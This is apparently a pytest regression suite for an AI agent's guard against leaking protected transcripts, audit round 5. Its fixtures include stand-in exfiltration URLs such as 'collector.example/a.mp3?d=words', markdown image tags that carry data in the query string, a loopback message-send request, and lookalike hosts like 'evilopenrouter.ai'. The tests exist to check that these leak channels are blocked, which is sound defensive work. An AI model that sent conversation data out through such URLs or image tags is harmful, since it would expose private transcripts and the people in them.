"""Audit round 5 of the protected-session egress guard, as regression tests.

Each test asserts the fixed behaviour. The papareo_transcribe strings in
fixtures/papareo_plugin/strings.json are copied verbatim from that plugin. No
transcript content; no network (httpx.MockTransport still passes the guard hook).
"""
from __future__ import annotations

import asyncio
import json
import pathlib
import threading
import weakref
from unittest.mock import patch

import httpx
import pytest

from agent import protected_session as ps

PLUGIN = json.loads((pathlib.Path(__file__).parent / "fixtures" / "papareo_plugin"
                     / "strings.json").read_text(encoding="utf-8"))
PRIMARY = {"model": "primary/model", "provider": "custom",
           "base_url": "http://127.0.0.1:9/v1", "api_key": "k", "api_mode": "chat_completions"}


class Agent:  # weakref-able stand-in for AIAgent
    def __init__(self, **kw):
        self.session_id = "s1"
        self._session_db = None
        self._session_init_model_config = {}
        self._protected_session = False
        self._protected_primary = dict(PRIMARY)
        self._cached_system_prompt = ""
        self.ephemeral_system_prompt = None
        self.prefill_messages = []
        self._session_messages = []
        self.__dict__.update(kw)


@pytest.fixture
def protected():
    a = Agent()
    token = ps.activate(a)
    ps.mark_protected(a, "test")
    try:
        yield a
    finally:
        ps.reset(token)


@pytest.fixture
def loop():
    lp = asyncio.new_event_loop()
    threading.Thread(target=lp.run_forever, daemon=True).start()
    ps.register_delivery_loop(lp)
    yield lp
    lp.call_soon_threadsafe(lp.stop)


async def _get(url, seen):
    async with httpx.AsyncClient(transport=httpx.MockTransport(
            lambda r: seen.append(str(r.url)) or httpx.Response(200))) as c:
        try:
            await c.get(url)
            return "sent"
        except ps.ProtectedEgressBlocked:
            return "blocked"


# ── the real plugin strings ──────────────────────────────────────────────────

@pytest.mark.parametrize("name", ["NEXT_PAPAREO", "NEXT_PAPAREO_DIRECT", "ASK_FIRST", "PAPAREO_SOURCE"])
def test_real_plugin_strings_do_not_mark(name):
    result = json.dumps({"sent": True, "engine": "papareo", "transcribed_by": "Papa Reo, Te Hiku Media",
                         "handle": "om_x", "filename": "transcript.txt", "next": PLUGIN[name]},
                        ensure_ascii=False)
    assert ps.scan(Agent(), [{"role": "tool", "content": result}]) is False


def test_real_footer_marks_and_local_transcript_does_not():
    body = "words.\n\n" + PLUGIN["FOOTER"] + "\n" + PLUGIN["NOTICE"]
    assert ps.scan(Agent(), [{"role": "user", "content": body}]) is True
    local = "words\n\nTranscribed by Whisper (large-v3-turbo).\n"
    assert ps.scan(Agent(), [{"role": "user", "content": local}]) is False


# ── 1: transcribe_recording(url=...) ─────────────────────────────────────────

def test_1_model_chosen_url_is_refused_in_a_protected_session(protected):
    out = ps.refuse_tool_if_protected("transcribe_recording",
                                      {"url": "https://collector.example/a.mp3?d=words",
                                       "engine": "papareo"})
    assert out == ps.PROTECTED_EGRESS_MESSAGE


def test_1_a_url_the_person_sent_and_a_local_path_still_work(protected):
    link = "https://share.example/voice-note.m4a"
    protected._session_messages = [{"role": "user", "content": f"please transcribe {link}"}]
    assert ps.refuse_tool_if_protected("transcribe_recording", {"url": link}) is None
    assert ps.refuse_tool_if_protected("transcribe_recording",
                                       {"path": "/cache/audio/note.ogg"}) is None


def test_1_a_url_only_in_a_tool_or_assistant_message_is_refused(protected):
    link = "https://collector.example/a.mp3"
    protected._session_messages = [{"role": "assistant", "content": link},
                                   {"role": "tool", "content": link}]
    assert ps.refuse_tool_if_protected("transcribe_recording", {"url": link}) is not None


# ── 2: CLI /new queues extraction of the old protected history ───────────────

class _External:
    name = "honcho"

    def __init__(self):
        self.got = []

    def on_session_end(self, messages):
        self.got.append(messages)

    def on_session_switch(self, *a, **k):
        pass


def test_2_new_session_extraction_of_protected_history_skips_external_providers():
    from agent.memory_manager import MemoryManager
    from run_agent import AIAgent

    ext = _External()
    a = Agent()
    ps.mark_protected(a, "test")
    mgr = MemoryManager()
    mgr._providers = [ext]
    mgr._protected_owner = weakref.ref(a)
    snapshot = [{"role": "user", "content": "old protected history"}]
    with patch.object(AIAgent, "_transition_context_engine_session"):
        try:
            AIAgent.reset_session_state(a)  # cli.py /new: before the boundary is queued
        except AttributeError:
            pass
    assert a._protected_session is False
    mgr.commit_session_boundary_async(snapshot, new_session_id="new", parent_session_id="s1")
    mgr.flush_pending(5)
    assert ext.got == []


def test_2_an_unprotected_old_session_still_reaches_external_providers():
    from agent.memory_manager import MemoryManager

    ext = _External()
    a = Agent(session_id="plain-old")
    mgr = MemoryManager()
    mgr._providers = [ext]
    mgr._protected_owner = weakref.ref(a)
    mgr.commit_session_boundary_async([{"role": "user", "content": "hello"}],
                                      new_session_id="new", parent_session_id="plain-old")
    mgr.flush_pending(5)
    assert len(ext.got) == 1


# ── 3: reply image URLs and the delivery host list ───────────────────────────

def test_3_unscoped_fetch_on_the_delivery_loop_in_a_protected_session_is_refused(protected, loop):
    seen = []
    r = asyncio.run_coroutine_threadsafe(_get("https://collector.example/x.png?d=words", seen),
                                         loop).result(5)
    assert r == "blocked" and seen == []


def test_3_delivery_hosts_are_a_fixed_list_never_learned(loop):
    tok = ps._SESSION.set(None)
    try:
        asyncio.run_coroutine_threadsafe(_get("https://other-collector.example/i.png", []), loop).result(5)
    finally:
        ps._SESSION.reset(tok)
    assert not ps.host_matches("other-collector.example", ps.delivery_hosts())
    assert not hasattr(ps, "_DELIVERY_HOSTS")


def test_3_platform_api_hosts_and_their_subdomains_are_delivery_hosts(protected, loop):
    with ps.egress_scope("tool:transcribe_recording"):
        for url in ("https://discord.com/api/v10/channels/1/messages",
                    "https://files.slack.com/upload/v1/x"):
            assert asyncio.run_coroutine_threadsafe(_get(url, []), loop).result(5) == "sent"
        assert asyncio.run_coroutine_threadsafe(
            _get("https://files.upload-host.example/u", []), loop).result(5) == "blocked"


def test_3_protected_reply_image_tags_become_plain_text():
    out = ps.defang_images("see ![chart](https://collector.example/x.png?d=w) and "
                           '<img src="https://collector.example/y.png">')
    assert "collector.example" not in out and "[image: chart]" in out


# ── 4: send_message and loopback ─────────────────────────────────────────────

def test_4_send_message_is_refused(protected):
    assert ps.refuse_tool_if_protected("send_message") == ps.PROTECTED_EGRESS_MESSAGE


def test_4_loopback_signal_cli_is_refused_from_a_tool_scope(protected):
    with ps.egress_scope("tool:some_tool"), pytest.raises(ps.ProtectedEgressBlocked):
        ps.check_request("http://127.0.0.1:8080/api/v1/rpc",
                         b'{"jsonrpc":"2.0","method":"send","params":{"recipient":["+0"]}}', {})


# ── 5: compliant mode returns the text without its footer ────────────────────

def test_5_a_papareo_result_with_text_marks_the_session():
    a = Agent()
    token = ps.activate(a)
    try:
        result = json.dumps({"sent": True, "engine": "papareo", "delivery": "direct",
                             "transcribed_by": PLUGIN["PAPAREO_SOURCE"], "filename": "t.txt",
                             "text": "placeholder transcript words", "kaitiakitanga_compliant": True,
                             "next": PLUGIN["NEXT_PAPAREO_DIRECT"]}, ensure_ascii=False)
        ps.scan_tool_result("transcribe_recording", result)
        assert a._protected_session is True
    finally:
        ps.reset(token)


@pytest.mark.parametrize("result", [
    {"sent": True, "engine": "papareo", "handle": "om_x"},            # handle only
    {"sent": True, "engine": "local", "text": "local words"},         # local engine
])
def test_5_handle_only_and_local_results_do_not_mark(result):
    a = Agent()
    token = ps.activate(a)
    try:
        ps.scan_tool_result("transcribe_recording", json.dumps(result))
        assert a._protected_session is False
    finally:
        ps.reset(token)


# ── follow-ups ───────────────────────────────────────────────────────────────

@pytest.mark.parametrize("provider,host", [("openrouter", "evilopenrouter.ai"),
                                           ("bedrock", "abc123.execute-api.us-east-1.amazonaws.com")])
def test_no_base_url_primary_does_not_match_hosts_it_does_not_own(provider, host):
    a = Agent(_protected_primary={"model": "m-1", "provider": provider, "base_url": ""})
    ps.mark_protected(a)
    tok = ps.activate(a)
    try:
        with pytest.raises(ps.ProtectedEgressBlocked):
            ps.check_request(f"https://{host}/v1/chat/completions", b'{"model":"m-1"}')
        if provider == "openrouter":
            ps.check_request("https://openrouter.ai/api/v1/chat/completions", b'{"model":"m-1"}')
    finally:
        ps.reset(tok)


def test_discord_does_not_inline_its_own_transcript_attachment():
    from plugins.platforms.discord.adapter import _holds_protected_transcript
    assert _holds_protected_transcript(("words\n\n" + PLUGIN["FOOTER"]).encode())
    assert not _holds_protected_transcript(b"meeting notes")
